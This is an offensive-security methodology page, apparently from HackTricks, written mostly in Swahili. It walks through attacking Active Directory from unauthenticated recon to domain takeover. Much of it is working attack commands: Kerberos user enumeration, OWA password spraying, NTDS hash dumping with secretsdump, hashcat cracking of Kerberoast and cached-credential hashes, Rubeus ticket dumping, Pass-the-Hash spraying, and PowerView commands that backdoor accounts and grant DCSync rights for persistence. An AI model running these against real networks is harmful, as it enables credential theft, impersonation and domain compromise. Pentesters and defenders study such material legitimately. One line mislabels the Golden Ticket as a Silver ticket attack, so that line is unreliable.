# Mbinu za Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Muhtasari wa msingi

**Active Directory** ni teknolojia ya msingi inayomruhusu **network administrators** kuunda na kusimamia kwa ufanisi **domains**, **users**, na **objects** ndani ya mtandao. Imetengenezwa ili iweze kukua, ikiruhusu kupanga idadi kubwa ya watumiaji katika **groups** na **subgroups** inayoweza kusimamiwa, pamoja na kudhibiti **access rights** kwa ngazi mbalimbali.

Muundo wa **Active Directory** una tabaka tatu kuu: **domains**, **trees**, na **forests**. **Domain** ina seti ya objects, kama **users** au **devices**, ambazo zinashiriki database moja. **Trees** ni vikundi vya domains vilivyo na muundo unaoshirikiwa, na **forest** inawakilisha mkusanyiko wa trees mbalimbali, zilizo na **trust relationships** kati yao, zikifanya tabaka la juu kabisa la muundo wa shirika. Haki maalum za **access** na **communication** zinaweza kuwekwa katika kila moja ya ngazi hizi.

Madhumuni muhimu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Inahifadhi taarifa zote zinazohusu Active Directory objects.
2. **Object** – Inamaanisha vitu ndani ya directory, ikiwa ni pamoja na **users**, **groups**, au **shared folders**.
3. **Domain** – Hutoa chombo cha kuhifadhia directory objects; inawezekana domains nyingi kuwepo ndani ya **forest**, kila moja ikiwa na seti yake ya objects.
4. **Tree** – Ni kundi la domains zinazoshiriki root domain moja.
5. **Forest** – Ni ngazi ya juu kabisa ya muundo wa shirika katika Active Directory, ikijumuisha trees kadhaa zenye **trust relationships** kati yao.

**Active Directory Domain Services (AD DS)** inajumuisha huduma mbalimbali muhimu kwa usimamizi wa kituo na mawasiliano ndani ya mtandao. Huduma hizi ni pamoja na:

1. **Domain Services** – Inaleta sehemu ya kuhifadhia data katikati na kusimamia mwingiliano kati ya **users** na **domains**, ikiwa ni pamoja na **authentication** na functionalities za **search**.
2. **Certificate Services** – Inasimamia utengenezaji, usambazaji, na usimamizi wa **digital certificates** salama.
3. **Lightweight Directory Services** – Inaunga mkono applications zinazotegemea directory kupitia **LDAP protocol**.
4. **Directory Federation Services** – Inatoa uwezo wa **single-sign-on** ili kuthibitisha watumiaji across web applications katika kikao kimoja.
5. **Rights Management** – Inasaidia kulinda nyenzo zilizo na hakimiliki kwa kudhibiti usambazaji na matumizi yasiyoidhinishwa.
6. **DNS Service** – Ni muhimu kwa utofauti wa majina ya domain (domain name resolution).

Kwa maelezo zaidi angalia: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili kujifunza jinsi ya **attack an AD** unahitaji kuelewa vizuri mchakato wa **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kuchukua mengi kwenye [https://wadcoms.github.io/](https://wadcoms.github.io) kupata muonekano wa haraka wa amri ambazo unaweza kuendesha ili ku-enumerate/exploit AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Ikiwa una ufikiaji wa mazingira ya **AD** lakini huna credentials/sessions unaweza:

- **Pentest the network:**
- Scan the network, pata machines na port zilizo wazi na jaribu **exploit vulnerabilities** au **extract credentials** kutoka kwao (kwa mfano, [printers could be very interesting targets](ad-information-in-printers.md)).
- Ku-enumerate DNS kunaweza kutoa taarifa kuhusu servers muhimu ndani ya domain kama web, printers, shares, vpn, media, n.k.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Angalia [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) kwa maelezo zaidi juu ya jinsi ya kufanya haya.
- **Check for null and Guest access on smb services** (hii haitafanya kazi kwenye versions za kisasa za Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina juu ya jinsi ya ku-enumerate SMB server unaweza kupatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina juu ya jinsi ya ku-enumerate LDAP unaweza kupatikana hapa (lipa **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Kusanya credentials kwa **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pata access kwa host kwa **abusing the relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials **exposing** **fake UPnP services with evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Toa usernames/majina kutoka kwa nyaraka za ndani, mitandao ya kijamii, services (hasa web) ndani ya mazingira ya domain na pia kutoka kwa yale yanayopatikana hadharani.
- Ukipata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu conventions mbalimbali za AD **username** (**read this** (https://activedirectorypro.com/active-directory-user-naming-convention/)). Conventions zinazotumika mara kwa mara ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila jina), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 za _random_ na namba 3 za _random_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Angalia kurasa za [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **invalid username is requested** server itajibu kwa kutumia **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, kutuwezesha kubaini kuwa username haikuhalali. **Valid usernames** zitaleta ama **TGT in a AS-REP** response au error _KRB5KDC_ERR_PREAUTH_REQUIRED_, ikionyesha kuwa user anahitaji kufanya pre-authentication.
- **No Authentication against MS-NRPC**: Kutumia auth-level = 1 (No authentication) dhidi ya MS-NRPC (Netlogon) interface kwenye domain controllers. Mbinu inaita function `DsrGetDcNameEx2` baada ya ku-bind MS-NRPC interface ili kukagua ikiwa user au computer ipo bila credentials yoyote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) inatekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [hapa](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ikikuona moja ya server hizi kwenye mtandao unaweza pia kufanya **user enumeration against it**. Kwa mfano, unaweza kutumia zana [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Unaweza kuwa na uwezo wa **obtain** baadhi ya challenge **hashes** za kuvunja kwa **poisoning** baadhi ya protocols za **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ikiwa umefanikiwa ku-orodhesha Active Directory utaweza kupata barua pepe zaidi na uelewa bora wa **network**. Unaweza kujaribu kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ili kupata ufikiaji wa mazingira ya AD.

### Steal NTLM Creds

Ikiwa unaweza **access** PCs au shares nyingine kwa **null** au **guest user** unaweza **place files** (k.m. SCF file) ambazo zikifunguliwa zitakuwa zina**trigger an NTLM authentication against you** ili uweze **steal** the **NTLM challenge** ili ku-crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** inachukulia kila NT hash uliyonayo kama candidate password kwa formats nyingine, polepole, ambazo key material inatokana moja kwa moja na NT hash. Badala ya brute-forcing passphrases ndefu ndani ya Kerberos RC4 tickets, NetNTLM challenges, au cached credentials, unaingiza NT hashes kwenye Hashcat’s NT-candidate modes na kuwarekebisha ili kuthibitisha password reuse bila kamwe kujifunza plaintext. Hii ni silaha hasa baada ya domain compromise ambapo unaweza kuvuna maelfu ya NT hashes za sasa na za kihistoria.

Tumia shucking wakati:

- Una NT corpus kutoka DCSync, SAM/SECURITY dumps, au credential vaults na unahitaji kujaribu reuse katika domains/forests nyingine.
- Unakamata RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, au DCC/DCC2 blobs.
- Unataka kuthibitisha reuse haraka kwa passphrases ndefu, zisizovunjika, na ku-pivot mara moja kwa Pass-the-Hash.

Mbinu hii **haitafanya kazi** dhidi ya encryption types ambazo keys sio NT hash (kwa mfano, Kerberos etype 17/18 AES). Ikiwa domain inalazimisha AES-tu, lazima urudi kwa regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Tumia `secretsdump.py` na history ili kupata set kubwa iwezekanavyo ya NT hashes (na thamani zao za zamani):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries hupanua sana candidate pool kwa sababu Microsoft inaweza kuhifadhi hadi hashes 24 zilizopita kwa kila account. Kwa njia zaidi za kuvuna siri za NTDS angalia:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) hutoka data za SAM/SECURITY za lokale na cached domain logons (DCC/DCC2). Ondoa duplicate na ungeze hizo hashes kwenye faili ile ile `nt_candidates.txt`.
- **Track metadata** – Hifadhi username/domain ambayo ilitengeneza kila hash (hata kama wordlist ina hex tu). Matching hashes inakuambia mara moja ni principal gani anareuse password pale Hashcat inapochapisha winning candidate.
- Pendelea candidates kutoka forest ile ile au trusted forest; hiyo inaongeza uwezekano wa overlap wakati wa shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes:

- NT-candidate inputs **must remain raw 32-hex NT hashes**. Disable rule engines (no `-r`, no hybrid modes) because mangling corrupts the candidate key material.
- These modes are not inherently faster, but the NTLM keyspace (~30,000 MH/s on an M3 Max) is ~100× quicker than Kerberos RC4 (~300 MH/s). Testing a curated NT list is far cheaper than exploring the entire password space in the slow format.
- Always run the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) because modes 31500/31600/35300/35400 shipped recently.
- There is currently no NT mode for AS-REQ Pre-Auth, and AES etypes (19600/19700) require the plaintext password because their keys are derived via PBKDF2 from UTF-16LE passwords, not raw NT hashes.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat derives the RC4 key from each NT candidate and validates the `$krb5tgs$23$...` blob. A match confirms that the service account uses one of your existing NT hashes.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

You can optionally recover the plaintext later with `hashcat -m 1000 <matched_hash> wordlists/` if needed.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. A successful match yields the NT hash already known in your list, proving that the cached user is reusing a password. Use it directly for PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) or brute-force it in fast NTLM mode to recover the string.

The exact same workflow applies to NetNTLM challenge-responses (`-m 27000/27100`) and DCC (`-m 31500`). Once a match is identified you can launch relay, SMB/WMI/WinRM PtH, or re-crack the NT hash with masks/rules offline.



## Enumerating Active Directory WITH credentials/session

Kwa hatua hii unahitaji kuwa **umepora credentials au session ya account halali ya domain.** Ikiwa una credentials halali au shell kama domain user, **ikumbukwe kwamba chaguzi zilizotajwa hapo awali bado ni chaguo za ku-compromise watumiaji wengine.**

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kuwa na account iliyoporwa ni **hatua kubwa ya kuanza ku-compromise domain nzima**, kwa sababu utaweza kuanza **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Ni rahisi sana kupata majina yote ya watumiaji wa domain kutoka Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). Kwenye Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting inahusisha kupata **TGS tickets** zinazotumika na services zinazohusishwa na user accounts na ku-crack encryption zao—ambazo zinategemea passwords za watumiaji—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Mara tu unapopata credentials unaweza kuangalia kama una ufikiaji kwa **machine** yoyote. Kwa hiyo, unaweza kutumia **CrackMapExec** kujaribu kuunganishwa kwa server nyingi kwa protocols tofauti, kulingana na port scans zako.

### Local Privilege Escalation

Ikiwa umepata credentials au session kama regular domain user na una **access** kwa user huyu kwenye **machine** yoyote ndani ya domain, unapaswa kujaribu kupata njia ya **escalate privileges locally na kutafuta credentials**. Hii ni kwa sababu ni kwa local administrator tu utaweza **dump hashes za watumiaji wengine** kutoka memory (LSASS) na lokalmente (SAM).

Kuna ukurasa kamili katika kitabu hiki kuhusu [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) na [**checklist**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Ni **gharamu** sana kwamba utapata **tickets** kwenye current user zinazokupa ruhusa ya kupata resources zisizotarajiwa, lakini unaweza kuangalia:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ikiwa umeweza kuorodhesha Active Directory utakuwa na **barua pepe zaidi na uelewa bora wa mtandao**. Inawezekana utapata uwezo wa kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sasa kwa kuwa una baadhi ya basic credentials unapaswa kukagua kama unaweza **kupata** faili zozote **zilisheheshwa ndani ya AD**. Unaweza kufanya hivyo kwa mkono lakini ni kazi ya kuchosha na kurudia-rudia (na zaidi ikiwa utapata mamia ya nyaraka unazohitaji kukagua).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ikiwa unaweza **kupata access kwenye PC nyingine au shares** unaweza **kuweka files** (kama SCF file) ambazo zikifikiwa zitachochea **NTLM authentication dhidi yako** ili uweze **steal** **NTLM challenge** ili kujaribu kuikata:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hitilafu hii iliruhusu mtumiaji yeyote aliyethibitishwa kuweza **kuathiri domain controller**.

{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**For the following techniques a regular domain user is not enough, you need some special privileges/credentials to perform these attacks.**

### Hash extraction

Kwa bahati nzuri umeweza **kupata udhibiti wa account ya local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).  
Kisha, ni wakati wa ku-dump all the hashes katika memory na kwa local.  
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Mara tu unapopata hash ya mtumiaji**, unaweza kuitumia kumfanyia **impersonate**.  
Unahitaji kutumia zana itakayefanya **NTLM authentication using** hiyo **hash**, **au** unaweza kuunda sessionlogon mpya na **kuinject** hiyo **hash** ndani ya **LSASS**, ili wakati wowote **NTLM authentication** itakapoendeshwa, **hash hiyo itatumika.** Chaguo la mwisho ndio mimikatz hufanya.  
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulio hili linalenga **kutumia user NTLM hash kuomba Kerberos tickets**, kama mbadala wa kawaida wa Pass The Hash juu ya protocol ya NTLM. Kwa hivyo, hii inaweza kuwa hasa **faidika katika mitandao ambako NTLM protocol imezimwa** na tu **Kerberos inaruhusiwa** kama protocol ya authentication.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika mbinu ya shambulio ya **Pass The Ticket (PTT)**, wahalifu **wanapora ticket ya authentication ya mtumiaji** badala ya password au hash zake. Ticket hii iliyoporwa kisha inatumika **kuimita mtumiaji (impersonate)**, kupata ufikiaji usioidhinishwa kwa rasilimali na huduma ndani ya mtandao.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrator** unapaswa kujaribu **login locally** kwenye **PCs** nyingine ukitumia hiyo.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Kumbuka kwamba haya yanaweza kuwa yenye **kelele** nyingi na **LAPS** yangepunguza hili.

### MSSQL Abuse & Trusted Links

Ikiwa mtumiaji ana vibali vya **access MSSQL instances**, anaweza kutumia hilo kutekeleza amri kwenye mwenyeji wa MSSQL (ikiwa inaendesha kama SA), **steal** NetNTLM **hash** au hata kutekeleza **relay** **attack**.\
Pia, ikiwa instance ya MSSQL inatendewa kama trusted (database link) na instance nyingine ya MSSQL. Ikiwa mtumiaji ana vibali juu ya database inayotendewa, atakuwa na uwezo wa **kutumia uhusiano wa trust kutekeleza queries pia kwenye instance nyingine**. Hii trust zinaweza kuunganishwa mnyororo na kwa hatua fulani mtumiaji anaweza kupata database iliyopangwa vibaya ambapo anaweza kutekeleza amri.\
**Links kati ya databases zinafanya kazi hata kupitia forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suite za inventory na deployment za third-party mara nyingi zinaonyesha njia zenye nguvu kuelekea credentials na code execution. Angalia:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ukikuta Computer object yenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una vibali vya domain kwenye computer hiyo, utaweza dump TGTs kutoka memory ya watumiaji wote wanaoingia kwenye computer hiyo.\
Hivyo, ikiwa **Domain Admin anaingia kwenye computer**, utaweza dump TGT yake na kumfanyia impersonate kwa kutumia [Pass the Ticket](pass-the-ticket.md).\
Shukrani kwa constrained delegation unaweza hata **ku compromise kwa njia ya moja kwa moja Print Server** (tumaini itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa user au computer imepewa ruhusa kwa "Constrained Delegation" itakuwa na uwezo wa **kujifanya mtumiaji yeyote ili kufikia baadhi ya services kwenye computer**.\
Kisha, uki **compromise hash** ya user/computer hii utakuwa na uwezo wa **kujifanya mtumiaji yeyote** (hata domain admins) kufikia services fulani.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na ruhusa ya **WRITE** kwenye Active Directory object ya computer ya mbali kunaruhusu kupata code execution yenye **vibali vilivyoinuliwa**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Mtumiaji aliyepigwa inaweza kuwa na baadhi ya **vibali vya kuvutia juu ya baadhi ya domain objects** ambavyo vinaweza kukuruhusu **kusonga** kwa lateral/**kondoo** vibali baadaye.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Kupata **Spool service inayosikiliza** ndani ya domain inaweza **kutumiwa** ili **kupata credentials mpya** na **kuongeza vibali**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ikiwa **watumiaji wengine** wanafikisha kwenye **mashine iliyopigwa**, inawezekana **kukusanya credentials kutoka memory** na hata **kuingiza beacons ndani ya mchakato wao** ili kujifanya wao.\
Kawaida watumiaji watafikia mfumo kupitia RDP, hivyo hapa kuna jinsi ya kufanya baadhi ya mashambulizi juu ya RDP sessions za watu wengine:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** hutoa mfumo wa kusimamia **local Administrator password** kwenye kompyuta zilizojoina domain, kuhakikisha inarandamizwa (randomized), ni ya kipekee, na inabadilishwa mara kwa mara. Nywila hizi zinawekwa kwenye Active Directory na upatikanaji unadhibitiwa kupitia ACLs kwa watumiaji walioidhinishwa pekee. Ukiwa na vibali vya kutosha vya kusoma nywila hizi, inawezekana kuzunguka kwenda kwenye kompyuta nyingine.

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Kukusanya certificates** kutoka kwa mashine iliyopigwa kunaweza kuwa njia ya kuongeza vibali ndani ya mazingira:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ikiwa **templates zilizo na udhaifu** zimesanidiwa inawezekana kuzitumia kuongezea vibali:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Mara utakapo pata **Domain Admin** au bora zaidi **Enterprise Admin** vibali, unaweza **dump** **domain database**: _ntds.dit_.

[**Maelezo zaidi kuhusu DCSync attack yanaweza kupatikana hapa**](dcsync.md).

[**Maelezo zaidi kuhusu jinsi ya kuiba NTDS.dit yanaweza kupatikana hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Baadhi ya mbinu zilizojadiliwa hapo juu zinaweza kutumika kwa persistence.\
Kwa mfano unaweza:

- Kufanya watumiaji wawe dhaifu kwa [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kufanya watumiaji wawe dhaifu kwa [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Kuwapa mtumiaji vibali vya [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Shambulio la **Silver Ticket** linalounda **TGS ticket halali** kwa huduma maalum kwa kutumia **NTLM hash** (kwa mfano, **hash ya account ya PC**). Njia hii inatumika kupata **vibali vya huduma**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Shambulio la **Golden Ticket** linahusisha mwizi kupata **NTLM hash ya account ya krbtgt** katika Active Directory (AD). Account hii ni maalum kwa sababu inatumika kusaini yote **Ticket Granting Tickets (TGTs)**, ambazo ni muhimu kwa uthibitishaji ndani ya mtandao wa AD.

Mara mwizi atakapopata hash hii, wanaweza kuunda **TGTs** kwa akaunti yoyote wanayotaka (shambulio la Silver ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizo tengenezwa kwa njia inayoweza **kupitisha mechanisms za kawaida za utambuzi wa golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Kuwa na certificates za account au uwezo wa kuzizalisha** ni njia nzuri ya kudumu kwenye account ya mtumiaji (hata kama atabadilisha password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

